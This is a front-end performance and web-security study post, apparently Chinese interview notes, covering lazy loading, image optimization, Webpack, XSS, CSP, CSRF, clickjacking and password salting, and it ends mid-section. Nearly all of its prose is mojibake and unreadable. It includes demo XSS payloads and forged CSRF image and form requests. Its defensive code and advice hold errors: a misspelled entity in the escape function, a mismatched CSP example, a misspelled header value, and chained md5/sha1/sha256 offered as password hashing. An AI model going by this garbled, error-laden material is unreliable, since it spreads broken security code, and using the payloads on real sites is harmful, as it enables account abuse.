ä¼˜å…ˆæ¸²æŸ“è¿‡ç¨‹æ‡’æ‰§è¡Œæ‡’æ‰§è¡Œå°±æ˜¯å°†æŸäº›é€»è¾‘å»¶åŽåˆ°ä½¿ç”¨æ—¶å†è®¡ç®—ã€‚è¯¥å³ä½¿å¯ä»¥ç”¨äºŽé¦–å±ä¼˜åŒ–ï¼Œå¯¹äºŽæŸäº›è€—æ—¶é€»è¾‘å¹¶ä¸éœ€è¦åœ¨é¦–å±å°±ä½¿ç”¨çš„ï¼Œå°±å¯ä»¥ä½¿ç”¨æ‡’æ‰§è¡Œã€‚æ‡’æ‰§è¡Œéœ€è¦å”¤é†’ï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡å®šæ—¶å™¨æˆ–è€…äº‹ä»¶çš„å›žè°ƒæ¥å”¤é†’ æ‡’åŠ è½½æ‡’åŠ è½½å°±æ˜¯å°†ä¸å…³é”®çš„èµ„æºå»¶åŽåŠ è½½ æ‡’åŠ è½½çš„åŽŸç†å°±æ˜¯åªåŠ è½½è‡ªå®šä¹‰åŒºåŸŸï¼ˆé€šå¸¸æ˜¯å¯è§†åŒºåŸŸï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯å³å°†è¿›å…¥å¯è§†åŒºåŸŸï¼‰å†…éœ€è¦åŠ è½½çš„ä¸œè¥¿ï¼Œå¯¹äºŽå›¾ç‰‡æ¥è¯´ï¼Œå…ˆè®¾ç½®å›¾ç‰‡çš„ src å±žæ€§ä¸ºä¸€å¼ å ä½å›¾ï¼Œå°†çœŸå®žçš„å›¾ç‰‡èµ„æºæ”¾å…¥ä¸€ä¸ªè‡ªå®šä¹‰å±žæ€§ä¸­ï¼Œå½“è¿›å…¥è‡ªå®šä¹‰åŒºåŸŸçš„æ—¶å€™ï¼Œå°±å°†è‡ªå®šä¹‰å±žæ€§æ›¿æ¢æˆ src å±žæ€§ï¼Œè¿™æ ·å›¾ç‰‡å°±ä¼šä¸‹è½½èµ„æºï¼Œå®žçŽ°äº†å›¾ç‰‡çš„æ‡’åŠ è½½ã€‚ æ‡’åŠ è½½ä¸ä»…å¯ä»¥ç”¨äºŽå›¾ç‰‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨åˆ«çš„èµ„æºä¸Šï¼Œæ¯”å¦‚è¿›å…¥å¯è§†åŒºåŸŸæ‰å¼€å§‹æ’­æ”¾è§†é¢‘ç­‰ç­‰ã€‚ æ–‡ä»¶ä¼˜åŒ–å›¾ç‰‡ä¼˜åŒ–è®¡ç®—å›¾ç‰‡å¤§å°å¯¹äºŽä¸€å¼ 100*100 çš„åƒç´ çš„å›¾ç‰‡æ¥è¯´ï¼Œæœ‰ 10000 ä¸ªåƒç´ ç‚¹ï¼Œå¦‚æžœæ¯ä¸ªåƒç´ ç‚¹éƒ½æ˜¯ç”¨ RGBA å­˜å‚¨çš„è¯ï¼Œæ¯ä¸ªåƒç´ æœ‰å››ä¸ªé€šé“ï¼Œæ¯ä¸ªé€šé“æœ‰ 1 ä¸ªå­—èŠ‚ï¼ˆ8ä½=1ä¸ªå­—èŠ‚ï¼‰ï¼Œæ‰€ä»¥å›¾ç‰‡çš„å¤§å°å¤§æ¦‚ä¸º39KBï¼ˆ10000x1x4/1024ï¼‰ ä½†æ˜¯åœ¨å®žé™…é¡¹ç›®ä¸­ï¼Œä¸€å¼ å›¾ç‰‡å¯èƒ½å¹¶ä¸éœ€è¦ä½¿ç”¨é‚£ä¹ˆå¤šé¢œè‰²åŽ»æ˜¾ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å‡å°‘æ¯ä¸ªåƒç´ çš„è°ƒè‰²æ¿æ¥å¯¹åº”ç¼©å°å›¾ç‰‡çš„å¤§å°ã€‚ å¤§è‡´æœ‰ä¸¤ä¸ªæ€è·¯ï¼š å‡å°‘åƒç´ ç‚¹ å‡å°‘æ¯ä¸ªåƒç´ ç‚¹èƒ½å¤Ÿæ˜¾ç¤ºçš„é¢œè‰² å›¾ç‰‡åŠ è½½ä¼˜åŒ– ä¸ç”¨å›¾ç‰‡ï¼Œèƒ½ç”¨ CSS æ˜¾ç¤ºçš„å°½é‡ä¸è¦ä½¿ç”¨å›¾ç‰‡ ç§»åŠ¨ç«¯æ¥è¯´ï¼Œä¸€èˆ¬å›¾ç‰‡éƒ½ç”¨ CDN åŠ è½½ï¼Œå¯ä»¥è®¡ç®—å‡ºé€‚é…å±å¹•å®½åº¦ï¼Œç„¶åŽåŽ»è¯·æ±‚å¯¹åº”è£å‰ªå¥½çš„å›¾ç‰‡ å°å›¾ä½¿ç”¨ base64 æ ¼å¼ å°†å¤šä¸ªå›¾ç‰‡æ•´åˆåœ¨ä¸€å¼ é›ªç¢§å›¾ é€‰æ‹©æ­£ç¡®çš„å›¾ç‰‡æ ¼å¼ å¯¹äºŽèƒ½å¤Ÿæ˜¾ç¤º WebP æ ¼å¼çš„æµè§ˆå™¨å°½é‡ä½¿ç”¨ WebP æ ¼å¼ã€‚å› ä¸ºè¿™ä¸ªæ ¼å¼å…·æœ‰æ›´å¥½çš„å›¾åƒæ•°æ®åŽ‹ç¼©ç®—æ³•ï¼Œèƒ½å¸¦æ¥æ›´å°çš„å›¾ç‰‡ä½“ç§¯ï¼Œè€Œä¸”æ‹¥æœ‰è‚‰çœ¼è¯†åˆ«æ— å·®åˆ«çš„å›¾ç‰‡è´¨é‡ï¼Œç¼ºç‚¹å°±æ˜¯å…¼å®¹æ€§ä¸å¥½ã€‚ å°å›¾ä½¿ç”¨ Pngï¼Œå…¶å®žå¯¹äºŽå¤§éƒ¨åˆ†å›¾æ ‡è¿™ç§å›¾ç‰‡ï¼Œå¯ä»¥ä½¿ç”¨ SVG ä»£æ›¿ ç…§ç‰‡ä½¿ç”¨ JPEG å…¶ä»–æ–‡ä»¶ä¼˜åŒ– CSS æ–‡ä»¶æ”¾åœ¨ head ä¸­ æœåŠ¡ç«¯å¼€å¯æ–‡ä»¶åŽ‹ç¼©åŠŸèƒ½ å°† script æ ‡ç­¾æ”¾åœ¨ body çš„åº•éƒ¨ï¼Œå› ä¸º JS æ–‡ä»¶æ‰§è¡Œä¼šé˜»å¡žæ¸²æŸ“ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å°† script æ”¾åœ¨ä»»ä½•åœ°æ–¹ï¼Œç„¶åŽåŠ ä¸Š defer ,è¡¨ç¤ºè¯¥æ–‡ä»¶å¹¶è¡Œä¸‹è½½ï¼Œä½†æ˜¯ä¼šæ”¾åœ¨ HTML è§£æžå®ŒæˆåŽé¡ºåºæ‰§è¡Œã€‚å¯¹äºŽæ²¡æœ‰ä»»ä½•ä¾èµ–çš„ JS æ–‡ä»¶åŠ ä¸Š async è¡¨ç¤ºåŠ è½½å’Œæ¸²æŸ“æ–‡æ¡£å…ƒç´ çš„è¿‡ç¨‹å’Œ JS æ–‡ä»¶çš„åŠ è½½ä¸Žæ‰§è¡Œå¹¶è¡Œæ— åºè¿›è¡Œ æ‰§è¡Œ JS ä»£ç è¿‡é•¿ä¼šå¡ä½æ¸²æŸ“ï¼Œå¯¹äºŽéœ€è¦æ—¶é—´è®¡ç®—çš„ä»£ç å¯ä»¥è€ƒè™‘ä½¿ç”¨ Webworker ã€‚å®ƒå¯ä»¥è®©æˆ‘ä»¬å¦å¼€ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œè„šæœ¬è€Œä¸å½±å“æ¸²æŸ“ã€‚ CDNé™æ€èµ„æºå°½é‡ä½¿ç”¨ CDN åŠ è½½ï¼Œç”±äºŽæµè§ˆå™¨å¯¹äºŽå•ä¸ªåŸŸåæœ‰å¹¶å‘è¯·æ±‚ä¸Šé™ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å¤šä¸ª CDN åŸŸåã€‚å¯¹äºŽ CDN åŠ è½½é™æ€èµ„æºéœ€è¦æ³¨æ„çš„æ˜¯ CDN åŸŸåè¦ä¸Žä¸»ç«™ä¸åŒï¼Œå¦åœ¨æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Šä¸»ç«™çš„ cookie å…¶ä»–ä½¿ç”¨ Webpack ä¼˜åŒ–é¡¹ç›® å¯¹äºŽ Webpack4ï¼Œæ‰“åŒ…é¡¹ç›®ä½¿ç”¨ production æ¨¡å¼ï¼Œè¿™æ ·ä¼šè‡ªåŠ¨å¼€å¯ä»£ç åŽ‹ç¼© ä½¿ç”¨ ES6 æ¨¡å—æ¥å¼€å¯ tree shakingï¼Œè¿™ä¸ªæŠ€æœ¯å¯ä»¥ç§»é™¤æ²¡æœ‰ä½¿ç”¨çš„ä»£ç  ä¼˜åŒ–å›¾ç‰‡ï¼Œå¯¹äºŽå°å›¾å¯ä»¥ä½¿ç”¨ base64 çš„æ–¹å¼å†™å…¥æ–‡ä»¶ä¸­ æŒ‰ç…§è·¯ç”±æ‹†åˆ†ä»£ç ï¼Œå®žçŽ°æŒ‰éœ€åŠ è½½ ç»™æ‰“åŒ…å‡ºæ¥çš„æ–‡ä»¶åæ·»åŠ å“ˆå¸Œï¼Œå®žçŽ°æµè§ˆå™¨ç¼“å­˜æ–‡ä»¶ ç›‘æŽ§å¯¹äºŽä»£ç è¿è¡Œé”™è¯¯ï¼Œé€šå¸¸çš„åŠžæ³•æ˜¯ä½¿ç”¨ window.onerror æ‹¦æˆªæŠ¥é”™ã€‚è¯¥æ–¹æ³•èƒ½æ‹¦æˆªåˆ°å¤§éƒ¨åˆ†çš„è¯¦ç»†æŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤– å¯¹äºŽè·¨åŸŸçš„ä»£ç è¿è¡Œé”™è¯¯ä¼šæ˜¾ç¤º Script error. å¯¹äºŽè¿™ç§æƒ…å†µæˆ‘ä»¬éœ€è¦ç»™ script æ ‡ç­¾æ·»åŠ  crossorigin å±žæ€§ å¯¹äºŽæŸäº›æµè§ˆå™¨å¯èƒ½ä¸ä¼šæ˜¾ç¤ºè°ƒç”¨æ ˆä¿¡æ¯ï¼Œè¿™ç§æƒ…å†µå¯ä»¥é€šè¿‡ arguments.callee.caller æ¥åšæ ˆé€’å½’ å¯¹äºŽå¼‚æ­¥ä»£ç æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨ catch çš„æ–¹å¼æ•èŽ·é”™è¯¯ã€‚æ¯”å¦‚ Promise å¯ä»¥ç›´æŽ¥ä½¿ç”¨ catch å‡½æ•°ï¼Œasync await å¯ä»¥ä½¿ç”¨ try catch ä½†æ˜¯è¦æ³¨æ„çº¿ä¸Šè¿è¡Œçš„ä»£ç éƒ½æ˜¯åŽ‹ç¼©è¿‡çš„ï¼Œéœ€è¦åœ¨æ‰“åŒ…æ—¶ç”Ÿæˆ sourceMap æ–‡ä»¶ä¾¿äºŽ debugã€‚ å¯¹äºŽæ•èŽ·çš„é”™è¯¯éœ€è¦ä¸Šä¼ ç»™æœåŠ¡å™¨ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡ img æ ‡ç­¾çš„ src å‘èµ·ä¸€ä¸ªè¯·æ±‚ã€‚ é¢è¯•é¢˜å¦‚ä½•æ¸²æŸ“å‡ ä¸‡æ¡æ•°æ®å¹¶ä¸å¡ä½é¡µé¢ 12345678910111213141516171819202122232425setTimeout(() =&gt; &#123; const total = 100000; const once = 20; const loopCount = total / once; let countOfRender = 0; let ul = document.querySelector('ul'); function add() &#123; // ä¼˜åŒ–æ€§èƒ½ï¼Œæ’å…¥ä¸ä¼šé€ æˆå›žæµ const fragment = document.createDocumentFragment(); for (let i = 0; i &lt; once; i++) &#123; const li = document.createElement('li'); li.innerHTML = Math.floor(Math.random() * total); fragment.appendChild(li); &#125; ul.appendChild(fragment); countOfRender += 1; loop(); &#125; function loop() &#123; if (countOfRender &lt; loopCount) &#123; window.requestAnimationFrame(add); &#125; &#125; loop();&#125;, 0); å®‰å…¨XSSè·¨ç½‘ç«™æŒ‡ä»¤ç ï¼ˆè‹±è¯­ï¼šCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºï¼šXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹å¼çš„å®‰å…¨æ¼æ´žæ”»å‡»ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ä½¿ç”¨è€…å°†ç¨‹å¼ç æ³¨å…¥åˆ°ç½‘é¡µä¸Šï¼Œå…¶ä»–ä½¿ç”¨è€…åœ¨è§‚çœ‹ç½‘é¡µæ—¶å°±ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»æ”»å‡»é€šå¸¸åŒ…å«äº† HTML ä»¥åŠä½¿ç”¨è€…ç«¯è„šæœ¬è¯­è¨€ã€‚ XSS åˆ†ä¸ºä¸‰ç§ï¼šåå°„åž‹ï¼Œå­˜å‚¨åž‹å’Œ DOM-based å¦‚ä½•æ”»å‡»XSS é€šè¿‡ä¿®æ”¹ HTML èŠ‚ç‚¹æˆ–è€…æ‰§è¡Œ JS ä»£ç æ¥æ”»å‡»ç½‘ç«™ ä¾‹å¦‚é€šè¿‡ URL èŽ·å–æŸäº›å‚æ•° 12&lt;!-- http://www.domain.com?name=&lt;script&gt;alert(1)&lt;/script&gt; --&gt;&lt;div&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; ä¸Šè¿° URL è¾“å…¥å¯èƒ½ä¼šå°† HTML æ”¹ä¸º &lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt; ï¼Œè¿™æ ·é¡µé¢ä¸­å°±å‡­ç©ºå¤šäº†ä¸€æ®µå¯æ‰§è¡Œè„šæœ¬ã€‚è¿™ç§æ”»å‡»ç±»åž‹æ˜¯åå°„åž‹æ”»å‡»ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ DOM-based æ”»å‡»ã€‚ ä¹Ÿæœ‰å¦ä¸€ç§åœºæ™¯ï¼Œæ¯”å¦‚å†™äº†ä¸€ç¯‡åŒ…å«æ”»å‡»ä»£ç  &lt;script&gt;alert(1)&lt;/script&gt; çš„æ–‡ç« ï¼Œé‚£ä¹ˆå¯èƒ½æµè§ˆæ–‡ç« çš„ç”¨æˆ·éƒ½ä¼šè¢«æ”»å‡»åˆ°ã€‚è¿™ç§æ”»å‡»ç±»åž‹æ˜¯å­˜å‚¨åž‹æ”»å‡»ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ DOM-based æ”»å‡»ï¼Œå¹¶ä¸”è¿™ç§æ”»å‡»æ‰“å‡»é¢æ›´å¹¿ã€‚ å¦‚ä½•é˜²å¾¡æœ€æ™®éçš„åšæ³•æ˜¯è½¬ä¹‰è¾“å…¥è¾“å‡ºçš„å†…å®¹ï¼Œå¯¹äºŽå¼•å·ï¼Œå°–æ‹¬å·ï¼Œæ–œæ è¿›è¡Œè½¬ä¹‰ 12345678910function escape(str)&#123; str = str.replace(/&amp;/g,'&amp;amp;') str = str.replace(/&lt;/g,'&amp;lt;') str = str.replace(/&gt;/g,'&amp;gt;') str = str.replace(/"/g,'&amp;quto;') str = str.replace(/'/g,'&amp;#39;') str = str.replace(/`/g,'&amp;#96;') str = str.replace(/\//g,'&amp;#x2F;') return str;&#125; é€šè¿‡è½¬ä¹‰å¯ä»¥å°†æ”»å‡»ä»£ç  &lt;script&gt;alert(1)&lt;/script&gt; å˜æˆ 12// -&gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;#x2F;script&amp;gt;escape('&lt;script&gt;alert(1)&lt;/script&gt;') å¯¹äºŽæ˜¾ç¤ºå¯Œæ–‡æœ¬æ¥è¯´ï¼Œä¸èƒ½é€šè¿‡ä¸Šé¢çš„åŠžæ³•æ¥è½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œå› ä¸ºè¿™æ ·ä¼šæŠŠéœ€è¦çš„æ ¼å¼ä¹Ÿè¿‡æ»¤æŽ‰ã€‚è¿™ç§æƒ…å†µé€šå¸¸é‡‡ç”¨ç™½åå•è¿‡æ»¤çš„åŠžæ³•ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡é»‘åå•è¿‡æ»¤ï¼Œä½†æ˜¯è€ƒè™‘åˆ°éœ€è¦è¿‡æ»¤çš„æ ‡ç­¾å’Œæ ‡ç­¾å±žæ€§å®žåœ¨å¤ªå¤šï¼Œæ›´åŠ æŽ¨èä½¿ç”¨ç™½åå•çš„æ–¹å¼ã€‚ 1234var xss = require('xss')var html = xss('&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert("xss");&lt;/script&gt;')// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert("xss");&amp;lt;/script&amp;gt;console.log(html) ä»¥ä¸Šç¤ºä¾‹ä½¿ç”¨äº† js-xss æ¥å®žçŽ°ã€‚å¯ä»¥çœ‹åˆ°åœ¨è¾“å‡ºä¸­ä¿ç•™äº† h1 æ ‡ç­¾ä¸”è¿‡æ»¤äº† script æ ‡ç­¾ CSPå†…å®¹å®‰å…¨ç­–ç•¥ (CSP) æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ï¼Œç”¨äºŽæ£€æµ‹å¹¶å‰Šå¼±æŸäº›ç‰¹å®šç±»åž‹çš„æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™è„šæœ¬ (XSS) å’Œæ•°æ®æ³¨å…¥æ”»å‡»ç­‰ã€‚æ— è®ºæ˜¯æ•°æ®ç›—å–ã€ç½‘ç«™å†…å®¹æ±¡æŸ“è¿˜æ˜¯æ•£å‘æ¶æ„è½¯ä»¶ï¼Œè¿™äº›æ”»å‡»éƒ½æ˜¯ä¸»è¦çš„æ‰‹æ®µã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ CSP æ¥å°½é‡å‡å°‘ XSS æ”»å‡»ã€‚CSP æœ¬è´¨ä¸Šä¹Ÿæ˜¯å»ºç«‹ç™½åå•ï¼Œè§„å®šäº†æµè§ˆå™¨åªèƒ½å¤Ÿæ‰§è¡Œç‰¹å®šæ¥æºçš„ä»£ç ã€‚ é€šå¸¸å¯ä»¥é€šè¿‡ HTTP Header ä¸­çš„ Content-Security-Policy æ¥å¼€å¯ CSP åªå…è®¸åŠ è½½æœ¬ç«™èµ„æº 1Content-Security-Policy:default-src 'self' åªå…è®¸åŠ è½½ HTTPS åè®®å›¾ç‰‡ 1Content-Security-Policy:img-src https://* å…è®¸åŠ è½½ä»»ä½•æ¥æºæ¡†æž¶ 1Content-Security-Policy:child-src 'none' æ›´å¤šå±žæ€§å¯ä»¥æŸ¥çœ‹ è¿™é‡Œ CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attackæˆ–è€… session ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œ æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„ Web åº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéžæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚[1] è·Ÿè·¨ç¶²ç«™æŒ‡ä»¤ç¢¼ï¼ˆXSSï¼‰ç›¸æ¯”ï¼ŒXSS åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ã€‚ ç®€å•ç‚¹è¯´ï¼ŒCSRF å°±æ˜¯åˆ©ç”¨ç”¨æˆ·çš„ç™»å½•æ€å‘èµ·æ¶æ„è¯·æ±‚ã€‚ å¦‚ä½•æ”»å‡»å‡è®¾ç½‘ç«™ä¸­æœ‰ä¸€ä¸ªé€šè¿‡ Get è¯·æ±‚æäº¤ç”¨æˆ·è¯„è®ºçš„æŽ¥å£ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åœ¨é’“é±¼ç½‘ç«™ä¸­åŠ å…¥ä¸€ä¸ªå›¾ç‰‡ï¼Œå›¾ç‰‡çš„åœ°å€å°±æ˜¯è¯„è®ºæŽ¥å£ 1&lt;img src="http://www.domain.com/xxx?comment='attack'" /&gt; å¦‚æžœæŽ¥å£æ˜¯ Post æäº¤çš„ï¼Œå°±ç›¸å¯¹éº»çƒ¦ç‚¹ï¼Œéœ€è¦ç”¨è¡¨å•æ¥æäº¤æŽ¥å£ 123&lt;form action="http://www.domain.com/xxx" id="CSRF" method="post"&gt; &lt;input name="comment" value="attack" type="hidden" /&gt;&lt;/form&gt; å¦‚ä½•é˜²å¾¡é˜²èŒƒ CSRF å¯ä»¥éµå¾ªä»¥ä¸‹å‡ ç§è§„åˆ™ï¼š Get è¯·æ±‚ä¸å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ ä¸è®©ç¬¬ä¸‰æ–¹ç½‘ç«™è®¿é—®åˆ°ç”¨æˆ·çš„ Cookie é˜»æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™è¯·æ±‚æŽ¥å£ è¯·æ±‚æ—¶é™„å¸¦éªŒè¯ä¿¡æ¯ï¼Œæ¯”å¦‚éªŒè¯ç æˆ–è€…æ˜¯ token SameSite å¯ä»¥å¯¹ Cookie è®¾ç½® SameSite å±žæ€§ï¼Œè¯¥å±žæ€§è®¾ç½® Cookie ä¸éšç€è·¨åŸŸè¯·æ±‚å‘é€ï¼Œè¯¥å±žæ€§å¯ä»¥å¾ˆå¤§ç¨‹åº¦å‡å°‘ CSRF çš„æ”»å‡»ï¼Œä½†æ˜¯è¯¥å±žæ€§ç›®å‰å¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½å…¼å®¹çš„ éªŒè¯ Referer å¯¹äºŽéœ€è¦é˜²èŒƒ CSRF çš„è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡éªŒè¯ Referer æ¥åˆ¤æ–­è¯¥è¯·æ±‚æ˜¯å¦ä¸ºç¬¬ä¸‰æ–¹ç½‘ç«™å‘èµ·çš„ Token æœåŠ¡å™¨ä¸‹å‘ä¸€ä¸ªéšæœº Token ï¼ˆç®—æ³•ä¸èƒ½å¤æ‚ï¼‰ï¼Œæ¯æ¬¡å‘èµ·è¯·æ±‚æ—¶éƒ½å°† Token æºå¸¦ä¸Šï¼ŒæœåŠ¡å™¨éªŒè¯ Token æ˜¯å¦æœ‰æ•ˆ ç‚¹å‡»åŠ«æŒæ˜¯ä¸€ç§è§†è§‰æ¬ºéª—çš„æ”»å‡»æ‰‹æ®µ å¦‚ä½•æ”»å‡»æ”»å‡»è€…å°†éœ€è¦æ”»å‡»çš„ç½‘ç«™é€šè¿‡ iframe åµŒå¥—çš„æ–¹å¼åµŒå…¥è‡ªå·±çš„ç½‘é¡µä¸­ï¼Œå¹¶å°† iframe è®¾ç½®ä¸ºé€æ˜Žï¼Œåœ¨é¡µé¢ä¸­é€å‡ºä¸€ä¸ªæŒ‰é’®è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚ å¦‚ä½•é˜²å¾¡X-FRAME-OPTIONS æ˜¯ä¸€ä¸ª HTTP å“åº”å¤´ï¼Œä¸ºäº†é˜²å¾¡ç”¨ iframe åµŒå¥—çš„ç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚ å¯ä»¥è®¾ç½®ä¸‰ä¸ªå€¼ï¼Œåˆ†åˆ«æ˜¯ DENY,è¡¨ç¤ºé¡µé¢ä¸å…è®¸é€šè¿‡ iframe çš„æ–¹å¼æ¥å±•ç¤º SAMEORIGHT,è¡¨ç¤ºé¡µé¢åœ¨ç›¸åŒçš„åŸŸåä¸‹æ¥é€šè¿‡ iframe çš„æ–¹å¼å±•ç¤º ALLOW-FROM,è¡¨ç¤ºé¡µé¢å¯ä»¥åœ¨æŒ‡å®šæ¥æºçš„ iframe ä¸­å±•ç¤º ä¸­é—´äººæ”»å‡»ä¸­é—´äººæ”»å‡»æ˜¯æ”»å‡»æ–¹åŒæ—¶ä¸ŽæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å»ºç«‹èµ·äº†è¿žæŽ¥ï¼Œå¹¶è®©å¯¹æ–¹è®¤ä¸ºè¿žæŽ¥æ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯å®žé™…ä¸Šæ•´ä¸ªé€šä¿¡è¿‡ç¨‹éƒ½è¢«æ”»å‡»è€…æŽ§åˆ¶äº†ã€‚æ”»å‡»è€…ä¸ä»…èƒ½èŽ·å¾—åŒæ–¹çš„é€šä¿¡ä¿¡æ¯ï¼Œè¿˜èƒ½ä¿®æ”¹é€šä¿¡ä¿¡æ¯ã€‚ é€šå¸¸æ¥è¯´ä¸å»ºè®®ä½¿ç”¨å…¬å…±çš„ Wi-Fiï¼Œå› ä¸ºå¾ˆå¯èƒ½å°±ä¼šå‘ç”Ÿä¸­é—´äººæ”»å‡»çš„æƒ…å†µã€‚å¦‚æžœä½ åœ¨é€šä¿¡çš„è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°äº†æŸäº›æ•æ„Ÿä¿¡æ¯ï¼Œå°±å®Œå…¨æš´éœ²ç»™æ”»å‡»æ–¹äº†ã€‚ å½“ç„¶é˜²å¾¡ä¸­é—´äººæ”»å‡»å…¶å®žå¹¶ä¸éš¾ï¼Œåªéœ€è¦å¢žåŠ ä¸€ä¸ªå®‰å…¨é€šé“æ¥ä¼ è¾“ä¿¡æ¯ã€‚HTTPS å°±å¯ä»¥ç”¨æ¥é˜²å¾¡ä¸­é—´äººæ”»å‡»ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯è¯´ä½¿ç”¨äº† HTTPS å°±å¯ä»¥é«˜æž•æ— å¿§äº†ï¼Œå› ä¸ºå¦‚æžœä½ æ²¡æœ‰å®Œå…¨å…³é—­ HTTP è®¿é—®çš„è¯ï¼Œæ”»å‡»æ–¹å¯ä»¥é€šè¿‡æŸäº›æ–¹å¼å°† HTTPS é™çº§ä¸º HTTP ä»Žè€Œå®žçŽ°ä¸­é—´äººæ”»å‡»ã€‚ å¯†ç å®‰å…¨åŠ ç›ä¹Ÿå°±æ˜¯ç»™åŽŸæ¥çš„å¯†ç æ·»åŠ å­—ç¬¦ä¸²ï¼Œå¢žåŠ åŽŸå¯†ç çš„é•¿åº¦ 1sha256(sha1(md5(salt+password+salt))) ä½†æ˜¯åŠ ç›å¹¶ä¸èƒ½é˜»æ­¢åˆ«äººç›—çªƒè´¦å·ï¼Œåªèƒ½ç¡®ä¿å³ä½¿æ•°æ®åº“æ³„éœ²ï¼Œä¹Ÿä¸ä¼šæš´éœ²ç”¨æˆ·çš„çœŸå®žå¯†ç ã€‚ä¸€æ—¦æ”»å‡»è€…å¾—åˆ°äº†ç”¨æˆ·çš„è´¦å·ï¼Œå¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£çš„æ–¹å¼ç ´è§£å¯†ç ã€‚å¯¹äºŽè¿™ç§æƒ…å†µï¼Œé€šå¸¸ä½¿ç”¨éªŒè¯ç å¢žåŠ å»¶æ—¶æˆ–è€…é™åˆ¶å°è¯•æ¬¡æ•°çš„æ–¹å¼ã€‚å¹¶ä¸”ä¸€æ—¦ç”¨æˆ·è¾“å…¥äº†é”™è¯¯çš„å¯†ç ï¼Œä¹Ÿä¸èƒ½ç›´æŽ¥æç¤ºç”¨æˆ·è¾“é”™å¯†ç ï¼Œè€Œæ˜¯è´¦å·æˆ–è€…å¯†ç é”™è¯¯ ä»Ž V8 ä¸­çœ‹æ€§èƒ½ä¼˜åŒ–æµ‹è¯•æ€§èƒ½å·¥å…·ï¼šChrome Audits ä»¥åŠ Perfomance V8å¼•æ“Žå¼•å…¥äº† TurboFan ç¼–è¯‘å™¨ï¼Œä¼šåœ¨ç‰¹å®šçš„æƒ…å†µä¸‹è¿›è¡Œä¼˜åŒ–ï¼Œå°†ä»£ç ç¼–è¯‘æˆæ‰§è¡Œæ•ˆçŽ‡æ›´é«˜çš„ Machine Codeï¼Œå½“ç„¶è¿™ä¸ªç¼–è¯‘å™¨å¹¶ä¸æ˜¯ JS å¿…é¡»éœ€è¦çš„ï¼Œåªæ˜¯ä¸ºäº†æé«˜ä»£ç æ‰§è¡Œæ€§èƒ½ï¼Œæ‰€ä»¥æ€»çš„ æ¥è¯´ JS æ›´åå‘äºŽ è§£é‡Šåž‹è¯­è¨€ã€‚ 123JavaScript Source Code =&gt; [Parser] =&gt; Abstract Syntax Tree =&gt; [interpreter Ignition ] =&gt; [Complier TurboFan] || || ByteCode &lt;= Optimized Machine Code JS ä¼šé¦–å…ˆè¢«è§£æžä¸º AST ï¼Œè§£æžè¿‡ç¨‹æ¯”è¾ƒæ…¢ï¼Œä»£ç è¶Šå¤šï¼Œè§£æžçš„è¿‡ç¨‹ä¹Ÿå°±è€—è´¹è¶Šé•¿ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦åŽ‹ç¼©ä»£ç çš„åŽŸå› ã€‚å¦å¤–ä¸€ä¸ªå‡å°‘è§£æžæ—¶é—´çš„æ–¹å¼æ˜¯é¢„è§£æžï¼Œä½œç”¨äºŽæœªæ‰§è¡Œçš„å‡½æ•°ã€‚å¦å¤–å°½å¯èƒ½é¿å…åµŒå¥—å‡½æ•°å£°æ˜Žï¼Œå¯ä»¥é¿å…é‡å¤è§£æžã€‚ Ignition 